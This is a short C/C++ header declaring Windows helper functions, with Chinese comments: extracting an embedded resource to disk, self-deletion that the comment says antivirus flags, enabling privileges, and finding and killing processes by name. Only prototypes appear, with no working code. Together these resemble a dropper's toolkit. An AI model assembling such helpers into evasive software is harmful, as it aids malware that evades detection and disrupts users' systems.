#pragma once
/*//////////////////////////////////////////////////////////////////////////
辅助函数段


/////////////////////////////////////////////////////////////////////////*/


//随机字母
int SEU_RandEx(int min, int max);

//释放资源
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath);

//自我删除(报毒)
void DelSelf();

//更改权限
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);

//根据进程名找PID
DWORD GetPidByName(LPCSTR szProcName);


BOOL KillProcessByPid(DWORD dwPid);

BOOL KillProcessByName(LPCSTR szProcName);
